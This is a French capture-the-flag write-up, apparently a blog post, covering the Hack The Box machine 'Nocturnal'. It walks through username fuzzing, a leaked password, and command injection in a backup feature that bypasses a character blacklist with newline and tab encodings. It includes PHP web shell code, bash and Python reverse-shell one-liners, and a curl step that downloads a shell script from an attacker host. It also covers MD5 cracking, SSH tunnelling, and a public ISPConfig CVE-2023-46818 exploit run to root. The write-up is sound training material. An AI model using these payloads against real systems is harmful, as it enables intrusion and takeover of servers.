@@ -1,0 +1,810 @@
+﻿---
+title: "Nocturnal"
+date: "2025-08-21"
+tags:
+  [
+    "port-enumeration",
+    "path-traversal",
+    "credential-cracking",
+    "port-forwarding",
+    "remote-code-execution",
+    "privilege-escalation",
+  ]
+draft: false
+summary: >-
+  Chaîne complète d'exploitation sur la machine HTB Nocturnal : reconnaissance
+  méthodique, découverte d'un comportement menant à une exposition de fichiers
+  via fuzzing d'utilisateur, extraction d'un mot de passe dans un ODT, accès
+  au panel admin et injection de commandes via la fonctionnalité de backup,
+  reverse shell, énumération post-exploitation, craquage de hash MD5 pour SSH,
+  pivot via port-forwarding vers ISPConfig, et RCE finale via CVE-2023-46818
+  pour obtenir root.
+images:
+  - /static/images/nocturnal/logo.png
+---
+
+# Compromission de Nocturnal : Analyse Détaillée
+
+_Analyse de l'exploitation de la machine Nocturnal de Hack The Box_
+
+## Résumé
+
+Nocturnal présente un parcours d'exploitation riche en enseignements, où chaque échec guide vers la solution finale. Cette machine illustre parfaitement la réalité du pentesting : les fausses pistes, les ajustements de stratégie et la persistance nécessaire pour aboutir.
+
+**Détails de la machine :**
+
+- **Adresse IP :** 10.10.11.64
+- **Système d'exploitation :** Ubuntu Linux
+- **Difficulté :** Moyenne
+
+## Phase 1 : Reconnaissance Approfondie
+
+### Scan Initial : Plus que des Ports Ouverts
+
+Le scan Nmap révèle une surface d'attaque intéressante mais trompeuse :
+
+```bash
+nmap -sC -sV 10.10.11.64
+```
+
+**Ports filtrés analysés :**
+
+- **888/tcp** - AccessBuilder : Généralement utilisé pour l'administration de routeurs/switches
+- **1092/tcp** - OBRPD : Oracle Binary Remote Procedure Call, suggère une base de données
+- **1111/tcp** - LMSocialServer : Service de réseau social local
+- **6007/tcp** - X11:7 : Serveur d'affichage X11 distant
+- **7001/tcp** - AFS3-callback : Andrew File System pour le partage de fichiers
+- **8443/tcp** - HTTPS alternatif : Souvent utilisé pour des interfaces d'administration
+
+**Pourquoi ce scan détaillé ?** Ces ports filtrés peuvent indiquer des services internes accessibles après compromission. Bien qu'ils se révèlent finalement non exploitables directement, ils orientent notre stratégie vers la recherche de services localhost.
+
+### Tentatives d'Énumération Avancée
+
+#### Test des Ports Filtrés
+
+```bash
+nmap -sV -p888,1092,1111,6007,7001,7496,8443,20221 10.10.11.64
+```
+
+**Résultat :** Tous les ports restent inaccessibles depuis l'extérieur.
+
+**Leçon :** Les ports filtrés indiquent souvent des services internes qui deviennent pertinents après l'accès initial.
+
+#### Énumération DNS et Sous-domaines
+
+**Tentative de brute-force DNS :**
+
+```bash
+dnsrecon -t brt -d nocturnal.htb
+```
+
+**Résultat :** Aucun enregistrement trouvé.
+
+**Tentative de fuzzing de sous-domaines :**
+
+```bash
+ffuf -u http://10.10.11.64 -H "Host: FUZZ.nocturnal.htb" \
+     -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+     -mc 200 -fs 23914
+```
+
+**Résultat :** Aucun sous-domaine découvert.
+
+**Pourquoi ces tentatives ?** Les applications web modernes utilisent fréquemment des sous-domaines pour séparer les fonctionnalités. L'absence de sous-domaines nous oriente vers l'énumération de l'application principale.
+
+### Analyse Web Approfondie
+
+#### Identification des Technologies
+
+```bash
+whatweb -v -a 3 http://nocturnal.htb
+```
+
+**Informations cruciales révélées :**
+
+- **Email de contact :** support@nocturnal.htb
+- **Session PHP :** PHPSESSID (confirme l'usage de PHP)
+- **Serveur :** nginx 1.18.0 sur Ubuntu
+
+**Pourquoi cette analyse ?** L'email révèle potentiellement des conventions de nommage. Le cookie de session PHP confirme la stack technologique et suggère un état d'authentification.
+
+## Phase 2 : Première Tentative d'Exploitation
+
+### Upload de Fichiers : Échec Instructif
+
+Après création d'un compte utilisateur, la fonctionnalité d'upload semble prometteuse :
+
+<Image
+  src="/static/images/nocturnal/upload.png"
+  alt="upload de fichier"
+  width={1200}
+  height={720}
+  className="rounded-lg border"
+/>
+
+**Tentative 1 - Shell PHP basique :**
+
+```php
+<?php system($_GET["cmd"]); ?>
+```
+
+**Résultat :** "Invalid file type: pdf; doc; docx; xls; xlsx; odt are allowed"
+
+**Analyse de l'échec :** La restriction se base sur l'extension ET le MIME type.
+
+**Tentative 2 - Contournement MIME type :**
+
+Modification de l'en-tête `Content-Type` via Burp Suite :
+
+- Original : `Content-Type: application/x-php`
+- Modifié : `Content-Type: application/pdf`
+
+**Résultat :** Échec persistant.
+
+**Tentative 3 - Magic bytes :**
+
+Ajout des magic bytes PDF au début du fichier :
+
+```
+%PDF-1.4
+<?php system($_GET["cmd"]); ?>
+```
+
+**Résultat :** Échec.
+
+**Pourquoi ces tentatives échouent-elles ?** L'application implémente une validation robuste combinant :
+
+1. Vérification de l'extension
+2. Validation du MIME type
+3. Analyse des magic bytes
+
+Cette approche de défense en profondeur nécessite de trouver un autre vecteur d'attaque.
+
+## Phase 3 : Découverte de la Vulnérabilité LFI 🔍
+
+### Analyse Comportementale de l'Application
+
+Observation cruciale : même en spécifiant un mauvais nom de fichier, l'application affiche tous les fichiers de l'utilisateur.
+
+**URL testée :**
+
+```
+http://nocturnal.htb/view.php?username=testuser&file=nonexistent.pdf
+```
+
+**Comportement observé :** L'application liste tous les fichiers de `testuser`, révélant une logique de traitement basée sur le paramètre `username`.
+
+### Fuzzing Méthodique des Utilisateurs avec Burp Suite 🎯
+
+**Pourquoi fuzzer les usernames ?** Si l'application utilise le paramètre `username` pour localiser les fichiers, d'autres utilisateurs pourraient avoir des fichiers accessibles.
+
+**Étape 1 - Interception avec Burp Suite :**
+Utilisation de Burp Suite pour intercepter une requête légitime vers `view.php` :
+
+<Image
+  src="/static/images/nocturnal/burp_requete.png"
+  alt="requete Burp"
+  width={1200}
+  height={720}
+  className="rounded-lg border"
+/>
+
+```http
+GET /view.php?username=testuser&file=test.pdf HTTP/1.1
+Host: nocturnal.htb
+Accept-Language: fr-FR,fr;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://nocturnal.htb/dashboard.php
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=an6nlv2chatu1pl5m237bh6j1i
+Connection: keep-alive
+```
+
+**Étape 2 - Copy to file avec Burp :**
+Clic droit sur la requête interceptée → "Copy to file" → Sauvegarde dans `vue.req`
+
+**⚠️ Modification manuelle du fichier :**
+Remplacement de `testuser` par `FUZZ` pour le fuzzing :
+
+```bash
+cat > vue.req << 'EOF'
+GET /view.php?username=FUZZ&file=test.pdf HTTP/1.1
+Host: nocturnal.htb
+Accept-Language: fr-FR,fr;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://nocturnal.htb/dashboard.php
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=an6nlv2chatu1pl5m237bh6j1i
+Connection: keep-alive
+EOF
+```
+
+**Étape 3 - Fuzzing avec ffuf :**
+
+```bash
+ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
+     -request vue.req -request-proto http -fs 2985
+```
+
+**📊 Paramètres expliqués :**
+
+- `-fs 2985` : Filtre les réponses de taille 2985 octets (réponse standard pour utilisateur inexistant)
+- `-request vue.req` : Utilise le fichier de requête Burp exporté
+- `-request-proto http` : Force le protocole HTTP
+
+**✅ Utilisateurs découverts avec tailles différentes :**
+
+- `admin` : 3037 octets 👑
+- `amanda` : 3113 octets 📈 (la plus importante)
+- `Mike` : 3105 octets 👤
+- `tobias` : 3037 octets 🎯
+
+**💡 Analyse des tailles :** La différence de taille suggère que ces utilisateurs ont des fichiers différents ou des permissions particulières. Amanda semble particulièrement intéressante avec sa taille de réponse la plus élevée.
+
+### Extraction Ciblée des Fichiers
+
+**Test avec amanda (taille la plus importante) :**
+
+```
+http://nocturnal.htb/view.php?username=amanda&file=test.pdf
+```
+
+<Image
+  src="/static/images/nocturnal/fichier_amanda.png"
+  alt="fichier Amanda"
+  width={1200}
+  height={720}
+  className="rounded-lg border"
+/>
+
+**Découverte critique :** Récupération d'un fichier `privacy.odt` au lieu du `test.pdf` demandé.
+
+**Pourquoi ce comportement ?** L'application semble retourner un fichier par défaut quand le fichier demandé n'existe pas.
+
+### Analyse du Fichier ODT
+
+**Extraction du contenu :**
+
+Les fichiers ODT sont des archives ZIP. Extraction du contenu XML :
+
+```bash
+unzip -l privacy.odt
+# content.xml contient le texte principal
+```
+
+**Dans content.xml :**
+
+```xml
+<text:p>Mot de passe temporaire pour amanda : arHkG7HAI68X8s1J</text:p>
+```
+
+**Pourquoi cette information est-elle présente ?** Document interne de l'équipe IT contenant des credentials temporaires. Pratique dangereuse mais réaliste.
+
+## Phase 4 : Escalation vers l'Interface Admin
+
+### Authentification avec les Credentials Trouvés
+
+```
+Utilisateur : amanda
+Mot de passe : arHkG7HAI68X8s1J
+```
+
+<Image
+  src="/static/images/nocturnal/pass_amanda.png"
+  alt="Password Amanda"
+  width={1200}
+  height={720}
+  className="rounded-lg border"
+/>
+
+**Accès obtenu :** Panel d'administration avec nouvelles fonctionnalités :
+
+<Image
+  src="/static/images/nocturnal/admin_panel_access.png"
+  alt="Accès Admin Panel"
+  width={1200}
+  height={720}
+  className="rounded-lg border"
+/>
+
+- Visualisation des fichiers PHP source
+- Création de backups avec mot de passe
+
+<Image
+  src="/static/images/nocturnal/admin_panel_content.png"
+  alt="Contenu Panel Admin"
+  width={1200}
+  height={720}
+  className="rounded-lg border"
+/>
+
+### Analyse du Code Source
+
+**Fichier admin.php révélé :**
+
+```php
+<?php
+if (isset($_POST['backup']) && !empty($_POST['password'])) {
+    $password = cleanEntry($_POST['password']);
+    $backupFile = "backups/backup_" . date('Y-m-d') . ".zip";
+
+    if ($password === false) {
+        echo "<div class='error-message'>Error: Try another password.</div>";
+    } else {
+        $logFile = '/tmp/backup_' . uniqid() . '.log';
+
+        // VULNÉRABILITÉ CRITIQUE
+        $command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
+
+        $descriptor_spec = [
+            0 => ["pipe", "r"],
+            1 => ["file", $logFile, "w"],
+            2 => ["file", $logFile, "w"],
+        ];
+
+        $process = proc_open($command, $descriptor_spec, $pipes);
+        if (is_resource($process)) {
+            proc_close($process);
+        }
+
+        sleep(2);
+        $logContents = file_get_contents($logFile);
+        // Affichage du contenu du log (notre output)
+        echo "<pre>" . htmlspecialchars($logContents) . "</pre>";
+    }
+}
+?>
+```
+
+**Analyse de la vulnérabilité :**
+
+1. Le paramètre `$password` est injecté directement dans la commande système
+2. Malgré la fonction `cleanEntry()`, il existe des possibilités de contournement
+3. L'output de la commande est affiché dans la réponse web
+
+### Fonction de Filtrage et Contournement
+
+```php
+function cleanEntry($entry) {
+    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];
+
+    foreach ($blacklist_chars as $char) {
+        if (strpos($entry, $char) !== false) {
+            return false;
+        }
+    }
+
+    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
+}
+```
+
+**Caractères interdits analysés :**
+
+- `;` : Séparateur de commandes Unix
+- `&` et `&&` : Exécution conditionnelle
+- `|` : Pipe Unix
+- `$` : Variables et substitution de commandes
+- ` ` : Espace (séparateur d'arguments)
+- `` ` `` : Substitution de commandes
+- `{`, `}` : Expansion de variables
+
+**Stratégie de contournement :**
+Les caractères de contrôle non filtrés :
+
+- `%0a` : Newline (nouvelle ligne)
+- `%09` : Tabulation
+- `%0d` : Carriage return
+
+## Phase 5 : Exploitation de l'Injection de Commandes
+
+### Tests Progressifs
+
+**Test 1 - Validation de l'injection :**
+
+```
+password=test%0aid&backup=
+```
+
+**Résultat :**
+
+```
+id: extra operand '.'
+Try 'id --help' for more information.
+```
+
+**Analyse :** L'injection fonctionne ! Le `.` à la fin de la commande zip interfère avec `id`.
+
+**Test 2 - Commande plus propre :**
+
+```
+password=x%0awhoami&backup=
+```
+
+**Résultat :** `www-data`
+
+**Confirmation :** Nous avons une exécution de commandes en tant que `www-data`.
+
+### Tentatives de Reverse Shell Directes
+
+**Tentative 1 - Bash classique :**
+
+```
+password=x%0abash%09-c%09"bash%09-i%09>&%09/dev/tcp/10.10.14.116/4444%090>&1"&backup=
+```
+
+**Résultat :** `Error: Try another password.`
+
+**Analyse de l'échec :** Les caractères `"` et potentiellement d'autres caractères spéciaux sont détectés.
+
+**Tentative 2 - Python one-liner :**
+
+```
+password=x%0apython3%09-c%09"import%20socket,subprocess,os;s=socket.socket();s.connect(('10.10.14.116',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"&backup=
+```
+
+**Résultat :** `Error: Try another password.`
+
+**Analyse de l'échec :** Les parenthèses et virgules sont probablement filtrées par une validation supplémentaire côté client ou serveur.
+
+### Solution : Méthode de Téléchargement en Deux Étapes
+
+**Étape 1 - Création du script sur la machine d'attaque :**
+
+```bash
+cat > reverse.sh << 'EOF'
+#!/bin/bash
+/bin/bash -i > /dev/tcp/10.10.14.116/4444 0>&1
+EOF
+
+# Servir le fichier via HTTP
+python3 -m http.server 8081
+```
+
+**Pourquoi cette approche ?** Elle évite les caractères problématiques en les déplaçant dans un fichier externe.
+
+**Étape 2 - Téléchargement sur la cible :**
+
+```
+password=x%0acurl%09-o%09/tmp/rev.sh%09http://10.10.14.116:8081/reverse.sh&backup=
+```
+
+**Paramètres expliqués :**
+
+- `%0a` : Nouvelle ligne pour séparer de la commande zip
+- `%09` : Tabulation pour remplacer les espaces
+- `/tmp/rev.sh` : Répertoire temporaire accessible en écriture
+
+**Étape 3 - Préparation du listener :**
+
+```bash
+nc -lnvp 4444
+```
+
+**Étape 4 - Exécution du reverse shell :**
+
+```
+password=x%0abash%09/tmp/rev.sh&backup=
+```
+
+**Résultat :** Connexion reverse shell établie !
+
+### Stabilisation et Amélioration du Shell
+
+**Problème initial :** Shell basique sans fonctionnalités avancées.
+
+**Solution de stabilisation :**
+
+```bash
+# Étape 1: Spawn un PTY
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# Étape 2: Configuration de l'environnement
+export TERM=xterm
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+# Étape 3: Mode raw (sur la machine d'attaque)
+# Ctrl+Z pour backgrounder
+stty raw -echo; fg
+
+# Étape 4: Reset du terminal
+reset
+stty rows 24 columns 80
+```
+
+**Pourquoi chaque étape ?**
+
+- `pty.spawn()` : Crée un pseudo-terminal pour les fonctionnalités interactives
+- `TERM=xterm` : Active les couleurs et le contrôle du curseur
+- `PATH` complet : Assure l'accès à tous les binaires système
+- `stty raw -echo` : Transmet tous les caractères sans échappement
+- `reset` : Nettoie l'affichage du terminal
+- `stty rows/columns` : Configure la taille pour les éditeurs
+
+## Phase 6 : Énumération Post-Exploitation
+
+### Découverte des Services Internes
+
+```bash
+netstat -tulpn | grep LISTEN
+```
+
+**Services critiques découverts :**
+
+- `127.0.0.1:8080` : Service web interne (ISPConfig)
+- `127.0.0.1:3306` : MySQL
+- `127.0.0.1:33060` : MySQL X Protocol
+
+**Pourquoi le port 8080 est-il crucial ?** Service web accessible uniquement en localhost, suggérant une interface d'administration privilégiée.
+
+### Exploration du Système de Fichiers
+
+```bash
+find /var/www -name "*.db" -o -name "*.sql" 2>/dev/null
+```
+
+**Découverte majeure :**
+
+```
+/var/www/nocturnal_database/nocturnal_database.db
+```
+
+**Analyse de la base SQLite :**
+
+```bash
+sqlite3 /var/www/nocturnal_database/nocturnal_database.db
+
+sqlite> .tables
+uploads  users
+
+sqlite> .schema users
+CREATE TABLE users (
+    id INTEGER PRIMARY KEY,
+    username TEXT,
+    password TEXT
+);
+
+sqlite> SELECT * FROM users;
+1|admin|d725aeba143f575736b07e045d8ceebb
+2|amanda|df8b20aa0c935023f99ea58358fb63c4
+4|tobias|55c82b1ccd55ab219b3b109b07d5061d
+[...autres utilisateurs...]
+```
+
+**Analyse des hash :**
+
+- Format : MD5 (32 caractères hexadécimaux)
+- Absence de salt : Vulnérable au cracking par dictionnaire
+
+### Cracking des Hash MD5
+
+**Tentative avec hashcat local :**
+
+```bash
+echo "55c82b1ccd55ab219b3b109b07d5061d" > tobias_hash.txt
+hashcat -m 0 tobias_hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+**Alternative plus rapide - Services en ligne :**
+
+<Image
+  src="/static/images/nocturnal/pass_tobias.png"
+  alt="Password Tobias"
+  width={1200}
+  height={720}
+  className="rounded-lg border"
+/>
+
+CrackStation.net : Résultat immédiat pour le hash de tobias
+
+```
+55c82b1ccd55ab219b3b109b07d5061d = slowmotionapocalypse
+```
+
+**Pourquoi ce mot de passe ?** Mot de passe complexe mais présent dans les bases de données de hash précalculés.
+
+## Phase 7 : Escalation vers l'Utilisateur Tobias
+
+### Accès SSH
+
+```bash
+ssh tobias@10.10.11.64
+# Password: slowmotionapocalypse
+```
+
+**Vérifications post-connexion :**
+
+```bash
+id
+uid=1000(tobias) gid=1000(tobias) groups=1000(tobias)
+
+ls -la ~
+# user.txt présent
+
+# Découverte du flag user
+cat ~/user.txt
+cdfd...fbbd
+```
+
+### Énumération des Privilèges
+
+```bash
+sudo -l
+# [sudo] password for tobias:
+Sorry, user tobias may not run sudo on nocturnal.
+
+find / -perm -4000 2>/dev/null | head -10
+# Pas de SUID intéressants
+
+groups
+tobias (groupe standard)
+```
+
+**Analyse :** Tobias n'a pas de privilèges sudo directs. L'escalation doit passer par un autre vecteur.
+
+## Phase 8 : Exploitation du Service Internal (Port 8080)
+
+### Mise en Place du Tunnel SSH
+
+**Problème :** Le service sur 8080 n'est accessible qu'en localhost.
+
+**Solution :** Tunnel SSH local forwarding
+
+```bash
+ssh -L 9999:127.0.0.1:8080 tobias@10.10.11.64
+```
+
+**Paramètres expliqués :**
+
+- `-L` : Local port forwarding
+- `9999` : Port local sur notre machine
+- `127.0.0.1:8080` : Service cible sur la machine distante
+- Utilisation du port 9999 car 8080 est occupé par Burp Suite
+
+**Test de connexion :**
+
+```bash
+curl -I http://localhost:9999
+```
+
+**Résultat :**
+
+```
+HTTP/1.1 302 Found
+Location: /login/
+X-Powered-By: PHP/7.4.3-4ubuntu2.29
+```
+
+### Identification d'ISPConfig
+
+**Accès via navigateur :** `http://localhost:9999/login/`
+
+<Image
+  src="/static/images/nocturnal/isp_config.png"
+  alt="Isp Config"
+  width={1200}
+  height={720}
+  className="rounded-lg border"
+/>
+
+**Interface découverte :** ISPConfig Login Panel
+
+- Version visible : 3.2.10p1
+- Interface d'administration de serveur web
+
+### Tests d'Authentification
+
+**Tentative 1 :**
+
+```
+Utilisateur : tobias
+Mot de passe : slowmotionapocalypse
+Résultat : Accès refusé
+```
+
+**Tentative 2 :**
+
+```
+Utilisateur : admin
+Mot de passe : slowmotionapocalypse
+Résultat : Accès autorisé !
+```
+
+**Pourquoi admin:slowmotionapocalypse fonctionne ?** ISPConfig utilise probablement la même base d'utilisateurs, et l'utilisateur admin partage le mot de passe avec tobias.
+
+### Recherche de Vulnérabilités ISPConfig
+
+**Version identifiée :** ISPConfig 3.2.10p1
+
+**Recherche CVE :**
+
+```bash
+searchsploit ispconfig
+# Plusieurs résultats pour différentes versions
+
+searchsploit -w ispconfig 3.2
+# CVE-2023-46818 identifié
+```
+
+**CVE-2023-46818 :**
+
+- **Impact :** Remote Code Execution
+- **Versions affectées :** 3.2.11 et antérieures
+- **Vecteur :** Injection PHP dans le module de traduction
+
+## Phase 9 : Exploitation Finale - CVE-2023-46818
+
+### Téléchargement de l'Exploit
+
+```bash
+wget https://raw.githubusercontent.com/ajdumanhug/CVE-2023-46818/main/CVE-2023-46818.py
+```
+
+### Analyse du Code d'Exploit
+
+**Mécanisme d'exploitation :**
+
+1. **Authentification** sur ISPConfig
+2. **Récupération des tokens CSRF** depuis `/admin/language_edit.php`
+3. **Injection de payload PHP** via le paramètre `records`
+4. **Création d'un shell web** accessible via `/admin/sh.php`
+
+### Exécution de l'Exploit
+
+```bash
+python3 CVE-2023-46818.py http://localhost:9999 admin slowmotionapocalypse
+```
+
+**Trace d'exécution :**
+
+```
+[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
+[+] Login successful!
+[+] Fetching CSRF tokens...
+[+] CSRF ID: language_edit_f87246954fb44b35ded05721
+[+] CSRF Key: 405c57aada6e6c8f66deafb6e14baa88449f8a21
+[+] Injecting shell payload...
+[+] Shell written to: http://localhost:9999/admin/sh.php
+[+] Launching shell...
+```
+
+### Vérification des Privilèges
+
+```
+ispconfig-shell whoami
+root
+
+ispconfig-shell id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+**Pourquoi root ?** ISPConfig s'exécute avec des privilèges élevés pour gérer les configurations système.
+
+### Récupération du Flag Root
+
+**Problème initial :** Navigation limitée dans le shell web.
+
+**Solutions testées :**
+
+```bash
+# Tentative 1 - Navigation classique
+ispconfig-shell cd /root
+# Échec - pas de changement de répertoire
+
+# Tentative 2 - Chemin absolu
+ispconfig-shell ls -la /root/
+total 36
+drwx------  6 root root 4096 Aug 20 10:04 .
+[...contenu du répertoire...]
+-rw-r-----  1 root root   33 Aug 20 10:04 root.txt
+
+# Tentative 3 - Lecture directe
+ispconfig-shell cat /root/root.txt
+# Découverte du flag root
+002f...3de4
+```
+
+**Pourquoi la navigation échoue-t-elle ?** Le shell web maintient son contexte de démarrage (`/usr/local/ispconfig/interface/web/admin`). La solution est d'utiliser des chemins absolus.
